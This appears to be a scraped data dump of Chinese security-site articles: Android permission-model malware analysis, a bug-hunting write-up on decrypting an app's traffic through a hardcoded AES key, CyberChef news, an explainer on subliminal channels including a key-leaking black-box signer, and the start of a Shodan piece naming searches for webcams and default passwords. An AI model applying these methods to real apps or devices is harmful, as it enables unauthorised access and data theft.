6.0及以上版本中引入的新权限模型带来了高低版本应用的系统兼容性问题，对于开发者而言，需要同时注意开发平台编译应用所用的SDK版本与目标用户设备系统版本的兼容问题，否则可能导致程序编译不通过，甚至应用在目标设备中运行崩溃。目标设备系统版本与开发平台SDK版本的兼容性问题存在以下4种情况,如表2所示：表2 兼容性系统版本&gt;=6.0 &amp; SDK版本&gt;=23可以使用SDK 23及以上提供的动态权限检查、申请接口，如表3所示，同时在目标设备上使用新权限模型进行动态权限检查与申请；系统版本&gt;=6.0 &amp; SDK版本&lt;23版本低于23的SDK中未提供动态权限检查与申请的接口，因此对于使用低版本SDK（低于23）开发的应用，其在6.0及以上系统版本的设备中仍然以旧权限模型运行；系统版本&lt;6.0 &amp; SDK版本&gt;=23系统版本低于6.0的设备不支持新权限模型，为了保持应用对目标设备的向下兼容性，在进行动态权限检查与申请之前，最好先使用“Build.VERSION.SDK_INT &gt;= 23”检查系统版本，并根据不同系统版本进行不同处理；或者直接使用兼容包提供的权限检查、申请来兼容所有设备版本，如表4所示；系统版本&lt;6.0 &amp; SDK版本&lt;23应用旧权限模型，无需进行动态权限检查。表3 SDK 23及以上中权限检查与申请的方法表4 兼容包中权限检查与申请的方法三、恶意样本开始兼容新权限模型虽然新权限模型强制要求对Dangerous级权限的动态检查与申请，权限管理主动权在用户手中，但这种机制并非万能，我们仍然发现了大量使用了SDK 23及以上的恶意应用。我们对这些恶意应用样本进行了统计与分析，分析结果显示，动态权限模型并未从根本上阻止恶意应用的产生，尽管Dangerous权限需要用户动态授权，但很多恶意应用仍大肆申请Dangerous权限，一旦用户授权便进一步实施恶意操作，同时还加入了容错机制，即使用户拒绝授权也能继续正常运行，减少用户对其危险动机的感知。(一)恶意应用分布根据360烽火实验室的统计数据显示，截至2016年9月，使用了SDK 23及以上的恶意样本总数为24万个，占使用了SDK 23及以上的应用程序总量的12.2%。这些恶意样本按其恶意行为被分为162个家族，其中成员数量排名前十的家族如图13所示，从图中看到，PornBobo家族样本规模最大，该家族的主要恶意行为是色情诱导短信支付，涉及到短信相关危险权限。图13 代表恶意家族(二)恶意应用变化Android 6.0的动态权限模型从技术角度上来看增加了权限使用的透明度，能够从一定程度上缓解权限滥用的问题；但是，从图14可以看出，使用SDK 23及以上的相关恶意样本数量呈明显增长之势。这也体现出动态权限模型并不能从根本上遏制恶意样本的出现。图14 Android 6.0恶意样本占比趋势(三)恶意应用举例恶意软件展示——仿冒KingRoot官方应用的恶意样本，图标与应用名称都与官方应用相同图15 恶意软件恶意软件包含的Dangerous权限：READ_PHONE_STATE、RECEIVE_SMS、READ_EXTERNAL_STORAGE、WRITE_EXTERNAL_STORAGE 权限检查相关代码片段：应用启动主页面后，在回调函数中调用index方法，如图16所示：图16 应用启动后调用index方法index方法调用Application类中定义的startPermissionChecker方法开始进行权限检查，如图17所示：图17 在index方法中进行权限检查startPermissionChecker方法对动态权限检查行为进行了封装：首先检测当前系统版本是否小于6.0，若不小于则启动一个新的Activity进行权限检查，如图18所示：图18 权限动态检查权限检查Activity代码片段：图19 Dangerous权限检查当恶意软件被授予短信组权限时，其利用已获取的短信组权限接收系统短信广播并拦截新接收到的短信，窃取短信内容，造成用户隐私泄露。该恶意软件的其他恶意行为包括：诱导用户激活设备管理器隐藏图标检测并获取Root权限发送扣费短信窃取用户隐私信息四、小结从总体上看，Google在Android安全策略上呈现越来越严格的趋势，一方面，这说明随着Android的不断发展完善，Google越来越重视安全问题；而另一方面，这也从侧面放映了Android安全问题的严重性。虽然Google在Android 6.0及以上的系统版本中加入了动态权限模型，但恶意应用的对抗性与兼容性也在不断增强，仅依赖动态权限模型远远不能阻止不断演变的恶意应用。对此，我们提出了一些安全建议与看法，有助于预防感染恶意应用、阻止恶意应用的进一步恶意行为：对手机厂商而言，基于Android传统的权限授予机制与其带来的安全问题，部分手机厂商在定制自己的个性化系统时同时也添加了权限管理的功能，为用户提供了权限管理的入口，在一定程度上缓解了权限滥用问题。那么，Android 6.0的出现会给手机厂商带来怎样的影响呢？厂商在适配新的SDK版本时，如何友好地展现权限申请过程、如何优化权限管理机制、如何提高Android设备的安全程度？我们期待手机厂商给我们带来更加友好更加安全的Android设备。对开发者而言，应尽量使用SDK23及以上的版本来开发应用，并主动进行Dangerous权限动态检查与申请。现在处于动态权限检测与静态权限授予并存的过渡时期，可以预测未来Android操作系统与软件开发程序对静态权限授予模式的支持程度会大幅降低。对安全厂商而言，在各类Android恶意应用中，权限滥用类应用占很大比重。与之前的静态权限授予机制相比，新权限模型的出现给恶意应用作者带来不小的压力，同时给安全厂商带来更高要求。对用户而言，不管是静态权限模型还是动态权限模型，最终权限授予的主动权都在自己手中，特别是针对动态权限模型，用户具备更加灵活的权限管理能力，能够随时有效地阻止恶意行为，但如果用户不清楚最基本的权限与行为对应关系，那么想要通过动态权限模型增强设备安全就无从谈起。因此，用户应尽可能多地了解Android高危操作所涉及到的权限，以便在做出权限相关决策时尽量降低为设备带来的风险，同时，在日常用机时，尽量养成如下良好习惯：Ø 慎重授予应用程序请求的权限Ø 从可靠平台下载应用程序、安装来自受信任来源的应用程序Ø 及时更新系统版本与软件版本Ø 养成备份重要信息的好习惯Ø 安装安全类软件","2016-10-14 00:17:54","移动安全","Android系统新权限模型剖析与预警","http://nsoad.com/Article/MobileSecurity/20161014/536.html"
"5ccbfa264f2f0a0a7a69c01d","本人学习渗透测试（主要是Web方向）有几个月了，现在算是刚刚入门。回想起学习漏洞挖掘的过程，除了看一些经典书籍外，最想看的就是大牛们挖漏洞的详细过程，比如如何寻找目标，从哪里入手，遇到问题怎么解","silence","写在前面本人学习渗透测试（主要是Web方向）有几个月了，现在算是刚刚入门。回想起学习漏洞挖掘的过程，除了看一些经典书籍外，最想看的就是大牛们挖漏洞的详细过程，比如如何寻找目标，从哪里入手，遇到问题怎么解决。但是，网上介绍知识的多，叙述过程的少（也可能是我的搜索姿势不对……）。除了在乌云上有几个大神有时会分享一些具体的挖洞思路外，大部分人还是“有图有真相，一图胜千言”。对于老司机来说，瞄一眼就知道是怎么回事了，但对于新手来说，往往是一头雾水。因此，本人分享一下最近的一次挖洞过程，希望能够抛砖引玉，大家踊跃分享自己的挖洞经验。PS：作为一个有操守的白帽子，本文重在分享思路与过程，细节处还是要打码处理，毕竟不是来提交漏洞的。 寻找目标这次是针对我常用的一个手机APP（下文简称：某APP）进行漏洞挖掘，说起来选择某APP作为目标也是挺偶然的。因为我主要是搞Web渗透测试的，并没有挖过手机APP的漏洞。有一天，在看别人分享Burp Suite的使用技巧的文章时，发现通过Burp还能够进行手机APP抓包（毕竟Too young……）。光说不练假把式，还是要自己动手操练一番。先把Burp设置一下，在Proxy中Options下的Proxy Listeners中，点击Edit，把Bind to address设置为All interfaces。然后手机和电脑处于同一局域网中，给手机设置代理服务器，IP为电脑的IP地址，端口为Burp中的设置的端口，默认为8080。这时候，就可以用Burp抓取手机的请求包了。 山重水复这时候我就打开某APP，执行常见的操作，Burp中就记录了大量的HTTP数据报文。然后，就是对Burp中截获的报文进行分析了。没多久，一个请求就引起了我的注意。这是一条GET请求，请求的URL是类似下面这种格式：http://www.example.com/path/get_some_data.jsp?id=1234567&amp;param1=value1&amp;param2=value2直觉告诉我，这里很有可能会有越权漏洞。于是，我用浏览器打开这个URL，果然直接就看到了用户数据。换个id再试一下，把id加1，结果也是一样的，都爆出用户数据了。因此，到这里已经确定某APP存在越权漏洞。确定这个越权漏洞存在后，稍微平复一下心情，然后就发现这个漏洞造成的后果并不严重。因为这里通过帐号越权查看到的用户数据中，并没有包含一些比较敏感的数据，比如姓名、手机号、身份证等。简单地说，就是可以越权查看到他人的数据，但是“他人”是谁并不知道，这样来说看到数据只是一堆无意义的数字而已。只钓到一条小鱼有点不甘心，于是就继续挖，应该还有其他的漏洞存在。继续查看Burp捕获的报文，这次重点查看登录过程中提交的请求和返回的响应，想从这里入手深入挖掘一番。登录的报文如下，可以看到，只有一个POST参数params，其值经过了URL编码。把params的值解码之后，发现是json格式的一串数据，基本内容如下：其中，让人感兴趣的就是userId字段和body字段了，目测应该分别对应登录的用户名和密码。然后我用相同的用户名和不同的密码、不同的用户名和同样的密码分别登录、抓包，然后解码对比发现，相同的用户名对应的userId值相同，相同的密码对应的body值也相同，这就证实了我的推测。进一步分析发现，userId和body的值都是十六进制的数字串，userId的长度为32位（这里指32个十六进制字符，下同），body的长度为128位。这就说明userId和body的值都经过了加密处理。对于userId，我首先想到是不是经过了MD5？不过经过计算用户名的MD5和userId并不相等，也就是说，即便是MD5也加了salt。分析到这里，暂时没办法继续深入了。那就先放一放，分析一下登录过程中返回的数据包，下图是登录成功之后返回的数据包。一看返回的数据包直接傻眼了，明显是经过加密的。不过，这里还是要注意一下返回的数据包长度，因为我故意输入错误的密码进行登录时（如下图所示），返回的数据包长度居然相差无及！并且也能看到，有许多相同的字符。很显然，这里有很大的可能是有问题的。 柳暗花明到目前为止，虽然已经把登录过程中的请求报文结构都分析清楚了，但是由于报文中的关键数据都进行了加密处理，所以到现在几乎仍然是一筹莫展。事实上我在这里卡了两天，也没什么好的办法，甚至还想到过分析一下别人帐号登录过程中的数据包然后破解出密码的想法。不过仔细一想就觉得这个想法太不现实，又不是密码学专家，仅仅通过几条密文就想破解加密过程，这怎么可能成功！尽管想法有点荒唐，但是还真给我带来了灵感：既然某APP发送的报文和返回的报文都是加密的，那肯定是在某APP中进行了加密和解密的操作，那么如果能够分析一下某APP的源码，应该就能够搞清楚其中的加解密过程。那么问题来了，哪里能得到某APP的源码呢？思来想去，最方便、最有可能的办法就是将某APP进行反编译得到源码。ios版的我就不想了，毕竟也没搞过ios开发，直接去逆向肯定是不现实的。但是安卓版的还是有搞头的，因为之前看过别人进行APK逆向的文章，也写过Java代码。说干就干，网上搜一搜安卓逆向教程一大堆，毕竟咱只是想分析源代码，并不是要搞脱壳破解，入门级的教程就能够满足要求，这里就不多说了。总之，将某APP反编译之后，发现代码进行了混淆，但是并不影响分析，稍微费点劲而已。经过分析，果然有收获。首先，发现加解密使用了AES算法，并且加解密所用的密钥是16位的。继续分析发现，开发人员居然把密钥“几乎”硬编码在代码中！密钥总共16位，前面几位是网站域名，再加上devId的前几位，凑够16位即是密钥。而devId在登录的请求包中是以明文出现的，这样一来，相当于加密算法和密钥我们都得到了。到目前为止，分析的过程基本上就已经结束了，是时候写代码验证一下分析结果了。用Python写了AES加解密的代码，将userId和body进行解密之后发现，userId果然就是登录的用户名，而body的值则是如下json格式的字符串：很明显，password的值也经过了加密，这里有可能就是计算了MD5，不过有可能加了salt。继续分析源代码，找到了对密码进行处理的过程，果然是加了salt的MD5！并且，salt也是硬编码……拿自己的密码进行验证，证实了上述分析。 意外惊喜到现在为止，已经可以伪造数据包进行模拟登录过程了。事实上，我最初的想法也是想伪造数据包模拟登录进行暴力破解的。不过，在进行暴破之前，还是先把返回的响应报文解密看看。按照之前的分析，返回的报文肯定是有问题的。将响应报文解密之后，果然带来了更大的惊喜！前边已经提到，登录成功返回的数据包长度和失败时返回的数据包长度很接近，解密之后发现，何止是长度接近，内容也有九成是一样的！当然，这都不是重点，重点是不论登录是否成功，都返回了用户的真实数据，包括姓名、手机号、身份证号以及正确密码的哈希值，密码完全就是形同虚设。不枉费我一番心思，总算钓到大鱼！ 总结漏洞挖掘的过程基本上结束了，之后提交漏洞的过程我就不废话了。整个过程写起来有点像流水账，但是却把我挖掘漏洞的过程和思路写清楚了，总结起来就是：多看多想多动手实践，有事没事多抓包分析Web方面的挖洞思路和软件逆向相结合，带来意想不到的惊喜不要总想着暴力破解，那是没有办法的办法最后，希望此文能够抛砖引玉，大家都能把自己的挖洞思路分享出来。挖漏洞有时候确实需要一点灵感，多学习一下别人的挖洞思路，肯定能够对自己有所启发。","2016-10-09 11:38:10","移动安全","针对某APP的漏洞挖掘(抓包+逆向=挖到大漏洞)","http://nsoad.com/Article/MobileSecurity/20161009/507.html"
"5ccbfa264f2f0a0a7a69c01e","根据国外媒体的最新报道，英国情报机构政府通信总部（GCHQ）近日正式发布了CyberChef的源代码。CyberChef是一款新型的Web工具，安全研究人员可以使用这款工具对数据进行复杂的分析或解码工作。","kong","根据国外媒体的最新报道，英国情报机构政府通信总部（GCHQ）近日正式发布了CyberChef的源代码。CyberChef是一款新型的Web工具，安全研究人员可以使用这款工具对数据进行复杂的分析或解码工作。CyberChef介绍对数据进行分析和解密，是情报机构日常工作的重中之重，几乎任何一个国家的政府都会在数据分析技术上投入巨大的人力资源和物质资源。近期，英国情报机构-英国情报机构政府通信总部（GCHQ）发布了一款新型的开源Web工具，这款工具可以帮助安全研究人员更好地分析和解密数据。这款工具名为CyberChef，而它也被GCHQ誉为网络版的“瑞士军刀”。根据GCHQ在该项目Github主页上所提供的工具描述：“CyberChef是一款非常简单且直观的Web应用，使用者可以在一个Web浏览器中完成各种各样的网络操作。这些操作包括创建hexdump，进行XOR或Base64等简单的编码，进行类似AES、DES和Blowfish等复杂的加密处理，数据压缩或解压缩，计算哈希和校验值，以及对IPv6和X.509数据进行解析等等。”在CyberChef的帮助下，无论你是否是专业的信息分析专家，你都可以直接对手中的数据进行复杂的处理，而无需再去面对那些复杂的工具或算法。在过去的几年里，很多安全专家在这款工具的身上花费了大量的精力，该工具的设计与开发也将会极大地提升数据分析人员的工作效率。该工具的开发人员也在不断努力去编写出可读性更高、可扩展性更强的工具代码。不过需要提醒各位的是，这些安全专家并不是专业的程序员，而且代码的规范性也还没有经过同行的审核。该工具的一个明显优势就是其友好的用户操作界面，即便是一名非技术人员，他也可以直接通过简单的文件拖放来对目标数据进行加密、压缩和解压缩等操作。该工具不仅可以用来处理各种类型的数据，而且还可以解码Base64字符串，转换数据格式，以及很多其他的数据操作。CyberChef对于数据分析人员来说，绝对是一款非常强大的工具。不仅如此，数学家、开发人员、甚至一些猜谜游戏玩家都可以使用这款工具来完成自己的任务。根据GCHQ的描述，CyberChef可以在Chrome和Firefox这两款浏览器中运行。GCHQ预计，在他们将代码上传至Github之后，代码贡献者肯定会立刻为该工具做Edge浏览器的适配。GCHQ目前已经将该项目的源码上传至了Github【传送门】中，并且还附带了操作演示。GCHQ正在邀请社区的广大开发人员为该项目贡献代码，以期共同提升该工具的可用性。获取CyberChef工具试用-【点我】（注意事项：请使用Chrome或Firefox访问）源码获取-【点我】CyberChef的操作CyberChef的窗口中主要有四个主区域：1.“input”：输入窗口位于右上方，你可以直接在里面粘贴或输入你需要进行操作的数据。2.“output”：输出窗口位于右下方，数据处理结果会在该窗口中显示给用户。3.“operations”：操作选项在窗口的左侧，你可以直接选择需要进行的操作，或者使用搜索功能进行快速查询。4.“recipe”：参数设置栏位于窗口的中部，你可以在这里添加数据处理过程中所需的参数和选项。用户可以根据自己的需要来进行简单或复杂的数据处理工作。下面给大家提供了一些简单的使用样例，仅供参考。-解码Base64字符串【点我查看】-转换时区（时间和日期）【点我查看】-解析IPv6地址【点我查看】-转换数据格式、解压缩【点我查看】-显示完整日期的时间戳【点我查看】-对不同类型的数据进行不同的操作【点我查看】","2016-12-07 13:52:47","安全工具","英国GCHQ正式发布开源数据分析工具CyberChef（含使用示例）","http://nsoad.com/Security-tools/20161207/tools-894.html"
"5ccbfa264f2f0a0a7a69c01f","本文使用了Simmons论文中的公式，提到的阈下信道方案也并非作者发现，都是很多密码学家们的研究成果。不过这篇文章是作者原创，作者在各个平台都搜索过，似乎还没人发表过类似的科普文章。","silence","前言本文使用了Simmons论文中的公式，提到的阈下信道方案也并非作者发现，都是很多密码学家们的研究成果。不过这篇文章是作者原创，作者在各个平台都搜索过，似乎还没人发表过类似的科普文章。介绍场景模拟假设Alice和Bob被捕入狱，Bob被关在男牢房，而Alice被关在女牢房。看守Walter同意他们交换消息，但不允许他们加密。Walter明白，这样他们会商讨一个逃跑计划，他打算阅读他们之间的信件。Walter希望欺骗他们，他希望他们中的一个将一份欺诈的消息当做来自另一个人的真实消息。不过Alice和Bob愿意冒这种欺诈的危险，因为他们必须商讨他们的逃跑计划。为了完成这件事情，他们肯定要欺骗看守，并找出一个秘密通信的方法。他们建立一个阈下信道，即完全在Walter视野内的、他们之间的 一个秘密通信信道。通过交换无害的签名的消息，他们可以互相传送秘密消息，并骗过Walter，即使Walter始终监视着所有的通信。简单实现  一个简单的阈下信道可以是句子中单词的数目。句子中奇数个单词对应“1”，而偶数个单词对应“0”。因此，当读这种仿佛无关紧要的句子时，已经将信息“1010”传递给了自己的人员。不过这个例子的问题在于它没有密钥，安全性完全依赖于算法的保密性。阈下信道的概念是Gustavus J Simmons于1978年在美国圣地亚国家实验室（Sandia National Labs）提出的，之后又做了大量的研究工作。事实上，阈下信道签名算法与通常的签名算法区别不开，至少对Walter是这样，  Walter不仅读不出阈下信道消息，而且他也无法确定阈下信道已经存在。存在条件经典密码体制中不存在阈下信道。分组密码中也不存在阈下信道，因为与明文块相对应的密文块的大小是相同的。如果存在阈下信道，则一个明文块要对应多个不同的密文块，而事实上在大部分分组密码中，明文块与密文块都是一一对应的。不过在大多数基于公钥体制的签名方案中，文本m与数字签名S（m）不是一一对应的，这是由于会话密钥具有可选择性，从而对同一个消息可产生多个数字签名，即对每个m可以有多个S（m）。这就为阈下信道的存在提供了条件，接收方可以根据这些不同的数字签名获取监视者无法得到的阈下信息。有学者研究表明，绝大多数数字签名方案都可包含阈下信道的通信，其最大特点是阈下信息包含于数字签名之中，但对数字签名和验证的过程无任何影响，这正是其隐蔽性所在。即使监视者知道要寻找的内容，也很难发现信道的使用和获取正在传送的阈下消息。阈下信道的价值阈下信道提供了一种：仅有了解该协议的分组内才能得到消息，分组外无法得到，甚至无法发现有此信道存在的 通信方案。前些年比较热点的是将此技术应用在证书签发机构对用户的区分、认证上。Ong-Schnoor-Shamir关于 Ong-Schnoor-Shamir需要说明的是，这个签名方案基于二次多项式，在其出现不久就被证明是危险的方案。在此之后，方案的设计者又提出了基于三次多项式的算法，但是也同样被破译了。随后方案设计者们不屈不挠的提出了基于四次多项式的算法……然而……没错，很快又被破译了。。此处介绍这种签名方案，其一是因为Simmons第一次设计阈下信道时是基于这种签名算法，其二嘛……也对本方案的设计者的不屈不挠表示敬意。签名方案签署方首先选择一个大整数Ｎ，再选择一个与Ｎ互素的随机整数k，计算h：&gt;&gt;h = -k^(-2) mod Ｎ = -(-k^(-1))^2 mod Ｎ其中， h和n是私钥， k是公钥。对消息Ｍ签名时：首先产生一随机数r，r与N互素，然后计算：&gt;&gt;S1 = 1/2 * (M/r + r) mod N&gt;&gt;S2 = k/2 * (M/r – r) mod N此处Ｓ1, Ｓ2就是数字签名。TIPS: 签名时一般取M为消息原文的散列值。那么在验证数字签名时，只需要检验（用笔演算一下就可得到）：&gt;&gt;S1^2 + h * S2^2 === M mod N阈下信道利用方案阈下信道协议中，与原方案不同的是：接收方与签署方共享签名方案中的k值。并用需要被传递的信息E代替原方案中的随机数r。此处有一点限制是：E与N必须互素才能实现本次阈下信道。&gt;&gt;S1 = 1/2 * (M/E + E) mod N&gt;&gt;S1 = k/2 * (M/E – E) mod N此时， 只要所有量的值都满足方案中所给的限制，则接受方可以恢复出签署方隐藏的消息。同时，这一个签名依然有意义，可以用作身份验证。&gt;&gt;E = M/(S1 + S2 * K^(-1)) mod N这就是Simmons在1978年设计的一个阈下信道方案。虽然这个方案在现在看来几乎是完全不安全的，不过这为后人开启了一个思路，也创建了阈下信道这个概念~ElGamal关于ElGamalＥlGamal的安全性依赖计算有限域上离散对数的难度。它是一种即可以用于数字签名，又可用于加密的算法。就目前而言，这种算法是安全的。签名方案签署方首先选择一个素数p，两个小于p的随机数g和x。通过下述等式计算出y：&gt;&gt;y = g^x mod py, g, p用作公钥，x用做私钥。在对消息Ｍ签名时，首先选择一个随机数k，k与 p-1 互素。然后计算：&gt;&gt;a = g^k mod p使用扩展欧几里得算法，从下述等式中求出b：&gt;&gt;M = (x * a + k * b) mod (p-1)(a,b)就是本次的签名。TIPS: 签名时一般取M为消息原文的散列值。在验证签名时，只需验证：&gt;&gt;y^a * a^b mod p = g^M mod p注意：每次的签名中，k必须选择不同的值。且k的值必须保密。如果k的值泄露出去，那么可以很容易的通过模运算恢复出私钥x；如果两次签名中使用相同的k值，那么可以通过模运算求出k，然后求出私钥x。恢复方式如下：假设两次的消息分别是Ｍ1， Ｍ2；共用了一个k值；它们的签名分别是(a, b1)、(a, b2)：&gt;&gt;M1 – M2 = k * (b1 – b2) mod (p – 1)上式中只有一个未知量k, 可以通过欧几里得算法求出k的值。在知道k值后，因为数字签名的计算方法如下：&gt;&gt;M = (x * a + k * b) mod (p-1)此时只剩一个未知量x，可以通过欧几里得算法求出x的值。阈下信道利用方案签署方首先选择一个素数p，两个小于p的随机数g和x。第一步与正常签名算法相同：  &gt;&gt;y = g^x mod p不一样的地方：在选择随机数k时，将k值设为需要传递的消息E。注意：E，M，和p都必须相互完全互素。如下式计算a：  &gt;&gt;a = g^E mod p最后一步与原方案中的步骤一样，通过扩展欧几里得算法计算b，并将(a, b)当作签名。  &gt;&gt;M = (x * a + E * b) mod (p-1)接收方需要和签署方共享私钥x才能恢复出隐藏消息E：  &gt;&gt;E = ((M – x * a)*b^(-1)) mod (p-1)同时，数字签名(a, b)依然有意义，接收方可以正常验证这个签名是否是经过签署方的认证。在这次阈下信道中，签署方为阈下信道添加了一个私钥x，使得中间人就算猜到了这条签名中可能出现阈下信道，但依然无法恢复出被隐藏的信息E。但是这也带来了一个问题：接收方可以不受限制的冒充签署方对消息进行签名。这里的安全隐患依然存在。同时，这个阈下信道对隐藏信息的要求比较多（必须与M和p互素），在某些特定情况下，这种阈下信道可能无法起到作用。ESIGN关于ESIGNESIGN是由日本NTT提出的数字签名方案。对于同样长度的密钥、签名，它的安全性被保证至少和RSA， DSA一样。不过ESIGN的速度要比这两个算法快得多。签名方案签署方生成一对大素数p, q 作为私钥，生成一个公开的安全参数k，这个值被建议至少大于512。由下式生成公钥N：&gt;&gt;N = p^2 * q另取一个作用于消息M上的散列函数H(M)，要求是:&gt;&gt;0 &lt; H(M) &lt; n – 1除此之外，签署方需要选择一个小于p*q的随机数x。 计算签名时的流程：&gt;&gt;w = [(H(M) - x^k(mod N)) / p*q]&gt;&gt;z = w / k*x^(k-1) mod p&gt;&gt;s = x + z*p*qs是就是签署方的签名值。接收方收到消息与签名后，首先计算出t，t是比N的位数的2/3大的整数。在验证时，只需计算：&gt;&gt;H(M) &lt;= s^k mod N &lt; H(M) + 2^t若等式成立，则签名有效。阈下信道利用方案在ESIGN的阈下信道中，私钥除了p, q 以外，增加一个隐藏消息密钥素数r，密钥r是接收方在接收隐藏消息时需要的密钥。如下式计算出公钥N：&gt;&gt;N = p * q * r对消息签名时，签署方生成一个小于p*q的随机数u，并通过隐藏消息E如下式计算出x：&gt;&gt;x = E + u * r然后计算：&gt;&gt;w = [(H(M) - x^k(mod N)) / p*q*r]&gt;&gt;z = w / k*x^(k-1) mod p&gt;&gt;s = x + z*p*q*r接收方如果需要恢复出隐藏消息E，只需计算：&gt;&gt;s === x + z*p*q*r === E + u * r === E mod N接收方在得到隐藏消息E的同时，数字签名s依然有意义。在这次阈下信道中，接收方只知道一个密钥r，他如果想冒充签署方给文件签名，则需要分解p*q，但是分解因数问题依然存在，就是说：如果接收方想冒充签署方，则他需要付出的分解N的计算量 与不存在阈下信道时的接收方需要付出的分解N的计算量相同。相比之下，这种阈下信道对签署方来说更加安全。但是这次阈下信道中，N的值将是三个大素数的乘积。中间人可能通过N的大小来判断某次签名中是否存在阈下信道。DSA关于DSADSA是由NIST在1991年提出的数字签名算法。它曾被批评为政治性多于学术性……不过依然成为了数字签名标准DSS所采用的算法。本文不对此做评论。感兴趣的朋友自行谷歌……之所以在本文中提及这种算法，是因为阈下信道的提出人Simmons特意提过这种算法。在最后提到的黑盒签名器泄露私钥的方法对于其他签名算法的攻击，也是值得借鉴的。在此做个提醒，使用密码学库最好使用开源库，尽量不要使用封装好的商业软件。。签名方案p是L位长的素数，L的取值范围为512~1024，且L必须是64的倍数。【L的值曾被固定为512，不过被很多密码学者指责，后来NIST做了更正。】q是160位长，且与p-1互素的因子。另取小于p-1的随机数h，通过下式计算g，若g是小于1的数，则重新生成h，直到g&gt;1：&gt;&gt;g = h^(p-1)/q mod p取任意数x小于q&gt;&gt;y = g^x mod pDSA算法使用了一个散列函数H(m)，DSS标准指定该算法应为SHA。在近些年，对SHA-0、SHA-1的碰撞攻击的研究成果越来越多，在使用时应考虑使用更安全的散列生成算法。在签名中，前面三个参数p, q, g是公开的，可以被网络上的所有用户共用。私人密钥是X，公开密钥是y。在对消息m签名时，签署方首先生成一个小于q的随机数k：&gt;&gt;r = (g^k mod p) mod q&gt;&gt;s = (k^(-1)*(H(m) + x*r)) mod q r和s就是签署方的签名。接收方验证签名时，进行如下验证：&gt;&gt;w = s^(-1) mod q&gt;&gt;u1 = (H(m) * w) mod q&gt;&gt;u2 = (r * w) mod q&gt;&gt;v = ((g^u1 * y^u2) mod p) mod q如果 v=r 则签名有效。阈下信道的利用方案在利用过程中，接收方和签署方可以通过共享私钥x来传递隐藏信息r。（r是签名方案中的随机数）除此之外，还有一种不需要泄露私钥的隐藏信息传递方法。首先提及每次传递一个比特位的方案：签署方和接收方协商一个随机素数Z，如果签署方想发送给接收方1，则签署方生成一个随机数r，使签名参数r是随机素数Z的二次剩余。若想发送0，则生成一个随机数k，使签名参数r不是随机素数Z的二次剩余。因为二次剩余与非二次剩余的数字在数目上相差不大，所以随机数生成比较容易。这一方案可以很容易的扩展到一次传输多个比特位：签署方和接收方按顺序协商多个素数，生成随机数k，使得通过k计算出的r对这组有序素数的二次剩余情况分别对应隐藏消息的比特位。若设这个有序素数组中包含的元素为T个，则随机数k恰好符合要求的概率为 1/2^T 对于现在的计算机来说，只要T值不太大，生成k的速度差别几乎毫无影响。在具体平台上的结果不尽相同，感兴趣的朋友不妨自行测试一下。黑盒签名器泄露私钥对于恶意攻击者EVE来说，他只需要设计一个极难被逆向分析的闭源加密平台（比如对该软件使用“VM Protect”加壳），该加密平台接收用户的私钥，公钥和一段消息，返回消息与对消息的签名。那么EVE可以通过如下方案，每次在用户的签名数据中隐藏用户私钥的10位，且这个信息只有他能读取。同时这样签名出来的结果与正常签名的结果毫无不同。EVE规定14个素数，在用户签名时，随机选取用户私钥的10比特位作为隐藏消息，同时使用另外四位添加在十位私钥后作为对私钥块位置的标识。（私钥只有160位，所以只需要标记0~16就可以）EVE通过在因特网上查询用户的签名信息，就可以很容易的恢复出用户的私钥。比较麻烦的是：除非对该软件/芯片进行逆向分析，否则用户几乎不可能发现自己的私钥被泄露了。同时，就算用户怀疑自己的私钥被泄露了，他也无法证明这一点。对DSA中阈下信道的防范引入可信的第三方T，T生成一个随机数k1，签署器生成一个随机数k2，并计算k:&gt;&gt;k = k2^k1 mod(p-1)签署器返回一个值uu = g^k2 mod pT只需验证: &gt;&gt;((u^k1 mod p) mod q) = r若等式成立，则加密器使用了第三方给定的随机数k1。不过这一协议使得第三方T也有可能通过生成特殊的k1值，来在消息中隐藏一些信息。这种信道被称作布谷鸟信道。对这种信道的使用和防范感兴趣的朋友可以查阅论文：“Protocols that Ensure Fairness”“Subliminal Channels: Past and Present”总结对于阈下信道的研究一直进行着，有一些学者的结论表明，数字签名中的阈下信道是不可能完全封闭的。但是也有一些学者正在尝试着构造出绝对封闭的数字签名。对于普通的用户来说，只要做到签名时能由自己控制所有随机量，签署文件时使用开放源码的签名器，或者干脆自己开发一个库，那么对于用户的签名来说，阈下信道存在对于签署方的隐患几乎可以忽略了。不过当用户作为接收方时……那么似乎只能要求签署方选择对阈下信道限制比较严格的签名协议。不过，说到底，数字签名肯定是要由签署方完全自主生成的。在积极的一面来看，阈下信道有利于签署方对用户进行分类，对每个分组的用户进行定制的服务。从这个方面来看的话，阈下信道带来的结果也不完全是负面的。","2016-10-14 16:12:42","网络安全","数字签名中的幽灵——阈下信道","http://nsoad.com/Article/Network-security/20161014/560.html"
"5ccbfa264f2f0a0a7a69c020","CNN 曾在 2013 年 4 月 8 日 的新闻报道中称 Shodan 是“互联网上最可怕的搜索引擎”。 甚至光是听它的名字，就让人觉得不寒而栗！","kong","CNN 曾在 2013 年 4 月 8 日 的新闻报道中称 Shodan 是“互联网上最可怕的搜索引擎”。 甚至光是听它的名字，就让人觉得不寒而栗！ 那只是三年前对 Shodan 的描述，而三年后的今天，随着物联网的不断普及，Shodan 也将变得更加强大和可怕！对于那些还不了解 Shodan 的人，其实只要举个简单的例子你就会明白 Shodan 的强大。Shodan 可以搜索出，全世界任何联网的设备。例如：连网的电脑和智能手机。如果你觉得这还不够强大！那么我还可以告诉你，它还可以找到诸如，风力涡轮机，交通信号灯，车牌读取器，冰箱等任何具有网络连接的设备。试想一下，如果我们的设备没有受到较为安全的保护。那么，对于黑客而言入侵和控制它们将会变的非常容易！说了这么多，我并不是想在这里重复旧的新闻。其实我想告诉大家，Shodan 并不是唯一一个针对联网设备的搜索引擎，还有其它许多类似的搜索引擎。下面我将为大家介绍另外四个 Web 漏洞搜索引擎 。首先，让我们进一步的了解下 Shodan 。shodanShodan 和其它搜索引擎一样，每天都在互联网上不断的爬行和抓取信息 。其名字取自风靡一时的电脑游戏“ System Shock”中的邪恶主机。其保存的搜索项之一是“Server: SQ-WEBCAM”，它可以为我们显示出当前连接的多个 IP 摄像机 。如果你是第一次使用 Shodan，你可以尝试使用这个搜索语法来进行搜索，相信会有意想不到的收获！Shodan 之所以被认为是对黑客友好的搜索引擎，主要是因为利用它可以搜索到许多对黑客有利的信息（例如：banner 信息，连接类型等）。虽然这些信息也可以在像 Google 这样的搜索引擎上找到，但前提是你必须得知道正确的 Google 搜索语法 。如果你还没有害怕，看看这个。 另一个最受欢迎的搜索是“默认密码”。此搜索字词在横幅信息中找到具有 